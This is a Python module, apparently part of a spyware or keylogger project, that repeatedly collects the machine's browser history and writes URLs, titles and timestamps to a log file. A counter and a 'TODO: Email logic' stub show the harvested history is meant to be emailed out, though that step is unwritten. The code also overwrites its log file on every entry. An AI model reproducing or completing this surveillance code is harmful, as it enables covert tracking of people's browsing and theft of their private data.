from browserhistory import get_browserhistory
from utils.utils import log, handle_counter
from config import LOGS_DIRECTORY_PATH, BROWSER_INTERVAL, BROWSER_LOGS_PER_EMAIL
from time import sleep
from os.path import join
import sys


class BrowserLogger:
    def __init__(self):
        self.log_file_path = (
            join(LOGS_DIRECTORY_PATH, "browser.txt")
            if LOGS_DIRECTORY_PATH
            else "browser.txt"
        )
        self.error_file_path = (
            join(LOGS_DIRECTORY_PATH, "errors.txt")
            if LOGS_DIRECTORY_PATH
            else "errors.txt"
        )
        self.counter = 0
        self.counter_max = BROWSER_LOGS_PER_EMAIL
        self.interval = BROWSER_INTERVAL
        self.running = True

    def log_browser_history(self) -> None:
        browser_history = get_browserhistory()
        if browser_history:
            for browser, history in browser_history.items():
                for search in history:
                    log(
                        f"{search[2]}: {search[1]} ({search[0]})",
                        self.log_file_path,
                        mode="w",
                    )

    def handle_counter(self):
        self.counter += 1
        if handle_counter(self.counter, self.interval):
            pass  # TODO: Email logic

    def run(self):
        try:
            while self.running:
                self.log_browser_history()
                self.handle_counter()
                sleep(self.interval)
        except KeyboardInterrupt:
            self.running = False
        except Exception as e:
            self.running = False
            self.log_error("ERROR WHILE LOGGING BROWSER:", e)

    def log_error(self, message: str, exception: Exception) -> None:
        log(message, self.error_file_path)
        log(str(exception), self.error_file_path)


def main():
    browser_logger = BrowserLogger()
    try:
        browser_logger.run()
    except Exception:
        print("An error occurred while logging the browser.")
        print(f"See full error here: {browser_logger.error_file_path}")


if __name__ == "__main__":
    sys.exit(main())
